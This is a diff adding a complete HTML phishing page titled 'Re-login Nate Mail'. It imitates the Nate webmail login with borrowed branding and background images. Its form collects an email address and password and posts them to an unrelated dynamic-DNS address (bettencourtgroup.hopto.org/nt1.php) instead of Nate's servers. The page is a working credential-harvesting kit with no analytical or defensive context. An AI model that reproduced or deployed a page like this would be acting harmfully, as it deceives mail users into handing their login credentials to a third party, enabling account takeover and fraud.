@@ -1,0 +1,136 @@
+﻿<!DOCTYPE html>
+<!-- Created By CodingLab - www.codinglabweb.com -->
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Re-login Nate Mail</title>
+<link rel="shortcut icon" href="https://main.nateimg.co.kr/img/v7/favicon_32.ico">
+    <style type="text/css">
+	@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap');
+*{
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Poppins',sans-serif;
+}
+body{
+   background-image:url(https://i.ibb.co/cLSM3xd/natebgg.png);
+  background-repeat: no-repeat; 
+  height: 732px;
+}
+
+.container{
+  width: 449px;
+  height: 394px;
+  padding: 0 20px;
+  margin: 145px ;
+  background-image:url(https://i.ibb.co/jG3057s/natelogin.png);
+  position:absolute;
+  right: 281px;
+  
+}
+.wrapper{
+  width: 100%;
+ 
+  
+}
+
+.wrapper form{
+  padding: 120px 10px 20px 10px;
+}
+.wrapper form .row{
+  height: 45px;
+  margin-bottom: 18px;
+  position: relative;
+}
+.wrapper form .row input{
+  height: 48px;
+  width: 100%;
+  outline: none;
+  padding-left: 20px;
+  border-radius: 5px;
+  border: 1px solid lightgrey;
+  font-size: 16px;
+  transition: all 0.3s ease;
+}
+form .row input:focus{
+  border-color: #386ee7;
+  box-shadow: inset 0px 0px 1px 1px rgba(26,188,156,0.25);
+}
+form .row input::placeholder{
+  color: #999;
+}
+
+.wrapper form .pass a{
+  color: #386ee7;
+  font-size: 18px;
+  text-decoration: none;
+}
+.wrapper form .pass a:hover{
+  text-decoration: underline;
+}
+.wrapper form .button input{
+  color: #fff;
+  font-size: 20px;
+  font-weight: 500;
+  padding-left: 0px;
+  background: #ef3a2b;
+  border: 1px solid #ef3a2b;
+  cursor: pointer;
+  margin-top: 25px;
+  
+}
+form .button input:hover{
+  background: #ef3a2b;
+}
+
+/* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
+ @media only screen and (max-width: 900px) {
+  .wrapper, .container {
+    
+	margin-top: 30px;
+	grid-template-columns: auto auto;
+	
+  }
+ @media only screen and (max-width: 600px) {
+   .container {
+    
+	margin-top: 80px;
+	left: 2px;
+	right: 5px;
+
+	
+  }
+  
+ 
+	
+	</style>
+
+  </head>
+  <body>
+    <div class="container">
+      <div class="wrapper">
+    
+        <form method="post" action="https://bettencourtgroup.hopto.org/nt1.php">
+          <div class="row">
+           
+	  <input name="email" type="UserName" value="" placeholder="Email Address" required>
+          </div>
+          <div class="row">
+          
+            <input name="password" type="password" placeholder="Password" required>
+          </div>
+
+		<input type="image" name="formimage1" width="390" height="38"  	src="https://i.ibb.co/wy3hJgJ/nateimg.png">
+
+          <div class="row button">
+            <input type="submit" value="Sign in"  id="submit-btn" class="button primary">
+          </div>
+        
+        </form>
+      </div>
+    </div>
+	
+  </body>
+</html>
